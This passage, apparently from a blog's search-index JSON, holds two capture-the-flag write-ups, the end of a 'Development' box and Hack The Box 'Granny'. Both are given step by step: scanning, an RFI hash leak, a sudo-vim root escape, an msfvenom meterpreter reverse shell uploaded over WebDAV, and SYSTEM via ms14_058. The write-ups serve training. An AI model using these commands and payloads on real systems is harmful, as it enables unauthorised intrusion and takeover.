8080&lt;/address&gt;|_ &lt;/body&gt;&lt;/html&gt;|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: IIS 6.0|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8080-TCP:V=7.91%I=7%D=6/25%Time=60D5DBF3%P=x86_64-pc-linux-gnu%r(Ge[...SNIP...]MAC Address: 00:0C:29:53:15:AD (VMware)Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 4m10s, deviation: 0s, median: 4m09s|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: development| NetBIOS computer name: DEVELOPMENT\\x00| Domain name: \\x00| FQDN: development|_ System time: 2021-06-25T13:42:32+00:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-06-25T13:42:32|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 115.67 secondsWEB ENUMERATIONSince port 8080 is running http-proxy we will start with browsing Target’s IP address. Here we got some clue about html_pages.On reviewing the source code here they are talking about some Development secret page and Patrick is being mentioned, he could be a user:Moving through the html_pages mentioned earlier here, we found some html pages .After visiting the development.html page we found out that hackersecretpage was mentioned.Again after reviewing the source code of development.html page we found ./developmentsecretpage which might be the secret page we are looking for.On visiting the developmentsecretpage it is confirmed to be the Development secret page and a PHP file link named ‘Patrick’. is foundIf we visit the file link it opens a page with another file included in it named ‘Sitemap’.And when we visit /sitemap.php, we found a embedded link stating “Click here to logout”.When we click on the embeded link it turn out to be a login page.After trying some random user:pass we got some error on the page.when we googled about “slogin_lib.inc.php” we found an exploit on Exploit-db with the name of “/\\[path\\]/slog\\_users.txt” which is vulnerable to RFI. Refer CVE code: 2008-5762/63.So, when we appeded slog_users.txt to our secret page developmentsecretpage we found some users and their password hashes which was in MD5 format.on decrypting their hashes, we got passwords in clear text for an intern, Patrick and qiu respectively but not for Admin.SHELL AS INTERNSince port 22 is open we can now try to login with ssh as a intern user which was successful and we got restricted shell as intern.we have found some files but we cannot see it’s content since it is a restricted shell so we need to import a proper tty shell. we can import it with echo os.system (\"/bin/bash\")we now have a proper tty shell and we can view the contents of the files.SHELL AS PATRIKWe can now login as patrick user. On reviewing the sudo privilege for patrick user we can see that patrick can use vim and nano as root user.SHELL AS ROOTusing vim for privilege esclation: sudo /usr/bin/vim :!/bin/bash" }, { "title": "Hack The Box - Granny", "url": "/posts/Hack-The-Box-Granny/", "categories": "hackthebox", "tags": "windows, cve, metasploit, webdav, easy", "date": "2022-01-06 03:10:00 -0500", "snippet": "RECONNMAPStarting with nmap, nmap shows only port 80(http) is open. Port 80 : Microsoft IIS httpd 6.0# nmap -sT -p- --min-rate 10000 -oA granny-alltcp.htb 10.10.10.15 Starting Nmap 7.92 ( https:/...", "content": "RECONNMAPStarting with nmap, nmap shows only port 80(http) is open. Port 80 : Microsoft IIS httpd 6.0# nmap -sT -p- --min-rate 10000 -oA granny-alltcp.htb 10.10.10.15 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-04 14:32 +0545 Nmap scan report for 10.10.10.15 Host is up (0.077s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 43.54 seconds# nmap -p 80 -sC -sV 10.10.10.15 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-04 14:34 +0545 Nmap scan report for 10.10.10.15 Host is up (0.072s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-title: Error | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH |_ Server Date: Wed, 04 Jan 2023 08:49:15 GMT |_http-server-header: Microsoft-IIS/6.0 | http-ntlm-info: | Target_Name: GRANNY | NetBIOS_Domain_Name: GRANNY | NetBIOS_Computer_Name: GRANNY | DNS_Domain_Name: granny | DNS_Computer_Name: granny |_ Product_Version: 5.2.3790 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.51 secondsWEB PORT - 80Site shows it’s under constructionHeaders:# curl -I 10.10.10.15 HTTP/1.1 500 Internal Server Error Content-Length: 69 Content-Type: text/html Server: Microsoft-IIS/6.0 MicrosoftOfficeWebServer: 5.0_Pub X-Powered-By: ASP.NET Date: Wed, 04 Jan 2023 08:53:49 GMTX-Powered-By: ASP.NET header tells us that we may execute asp files if we can upload it.Gobuster┌─[✗]─[root@linux]─[/home/htb/windows_box/granny] └──╼ #gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.15 -t 50 -x aspx,txt,html =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.15 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: aspx,txt,html [+] Timeout: 10s =============================================================== 2023/01/04 15:18:48 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 149] [--&gt; http://10.10.10.15/images/] /Images (Status: 301) [Size: 149] [--&gt; http://10.10.10.15/Images/] /IMAGES (Status: 301) [Size: 149] [--&gt; http://10.10.10.15/IMAGES/]/_private (Status: 301)Both /images and /_private are empty dirs.WebDAVAbove nmap scan shows that webdav methods such as PUT, MOVE are enabled and we can use to upload files.DavtestWe’ll use davtest to explore further, and it will show us what types of files can be uploaded, and if it can create a directory:# davtest -url http://10.10.10.15 ******************************************************** Testing DAV connection OPEN SUCCEED: http://10.10.10.15 ******************************************************** NOTE Random string for this session: MOlGJTu00N6p6 ******************************************************** Creating directory MKCOL SUCCEED: Created http://10.10.10.15/DavTestDir_MOlGJTu00N6p6 ******************************************************** Sending test files PUT cfm SUCCEED: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.cfm PUT jsp SUCCEED: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.jsp PUT php SUCCEED: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.php PUT asp FAIL PUT pl SUCCEED: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.pl PUT txt SUCCEED: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.txt PUT cgi FAIL PUT aspx FAIL PUT jhtml SUCCEED: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.jhtml PUT html SUCCEED: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.html PUT shtml FAIL ******************************************************** Checking for test file execution EXEC cfm FAIL EXEC jsp FAIL EXEC php FAIL EXEC pl FAIL EXEC txt SUCCEED: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.txt EXEC jhtml FAIL EXEC html SUCCEED: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.html ******************************************************** /usr/bin/davtest Summary: Created: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6 PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.cfm PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.jsp PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.php PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.pl PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.txt PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.jhtml PUT File: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.html Executes: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.txt Executes: http://10.10.10.15/DavTestDir_MOlGJTu00N6p6/davtest_MOlGJTu00N6p6.htmlWe can upload alotof file types but not aspx, which is what we want.SHELL AS NETWORK SERVICEMeterpreterCreating a windows meterpreter reverse shell.# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.22 lport=4444 -f aspx &gt; shell.aspx[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of aspx file: 2886 bytesSince davtest suggested we cannot upload aspx directly so first we have to rename shell.aspx as shell.txt then rename it later as shell.aspx once uploaded.mv shell.aspx shell.txtcadaverWe’ll use cadvaer tool to upload files to the server.# cadaver -t 10.10.10.15 dav:/&gt; put shell.txt Uploading shell.txt to `/shell.txt': Progress: [=============================&gt;] 100.0% of 2886 bytes succeeded. dav:/&gt; mv shell.txt shell.aspx Moving `/shell.txt' to `/shell.aspx': succeeded. dav:/&gt; ls Listing collection `/': succeeded. Coll: DavTestDir_MOlGJTu00N6p6 0 Jan 4 14:52 Coll: _private 0 Apr 12 2017 Coll: _vti_bin 0 Apr 12 2017 Coll: _vti_cnf 0 Apr 12 2017 Coll: _vti_log 0 Apr 12 2017 Coll: _vti_pvt 0 Apr 12 2017 Coll: _vti_script 0 Apr 12 2017 Coll: _vti_txt 0 Apr 12 2017 Coll: aspnet_client 0 Apr 12 2017 Coll: images 0 Apr 12 2017 _vti_inf.html 1754 Apr 12 2017 iisstart.htm 1433 Feb 21 2003 pagerror.gif 2806 Feb 21 2003 postinfo.html 2440 Apr 12 2017 shell.aspx 2886 Jan 4 15:33 dav:/&gt;Here, we have uploaded shell.txt using the PUT method which was successful and then renamed to shell.aspx using the MOVE method.start metasploit multi handler.msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.22 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf6 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.14.22:4444 [*] Sending stage (175174 bytes) to 10.10.10.15 [*] Meterpreter session 1 opened (10.10.14.22:4444 -&gt; 10.10.10.15:1104) at 2023-01-04 21:01:37 +0545 meterpreter &gt; shell Process 3388 created. Channel 1 created. Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp. c:\\windows\\system32\\inetsrv&gt;whoami whoami nt authority\\network serviceSHELL AS SYSTEMmsf6 post(multi/recon/local_exploit_suggester) &gt; run [*] 10.10.10.15 - Collecting local exploits for x86/windows... [*] 10.10.10.15 - 176 exploit checks are being tried... [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Running check method for exploit 41 / 41 [*] 10.10.10.15 - Valid modules for session 1:MS14_058Description:This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability can be triggered through the use of TrackPopupMenu. Under special conditions, the NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary code execution.msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; sessions -i Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows NT AUTHORITY\\NETWORK SERVICE @ GRANNY 10.10.14.22:4444 -&gt; 10.10.10.15:1049 (10.10.10.15) msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; set session 1 session =&gt; 1 msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; run [*] Started reverse TCP handler on 10.10.14.22:4444 [*] Reflectively injecting the exploit DLL and triggering the exploit... [*] Launching netsh to host the DLL... [+] Process 3208 launched. [*] Reflectively injecting the DLL into 3208... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175686 bytes) to 10.10.10.15 [*] Meterpreter session 2 opened (10.10.14.22:4444 -&gt; 10.10.10.15:1050) at 2023-01-04 22:37:54 +0545 meterpreter &gt; shell Process 3308 created. Channel 1 created. Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp. c:\\windows\\system32\\inetsrv&gt;whoami whoami nt authority\\system" } ]
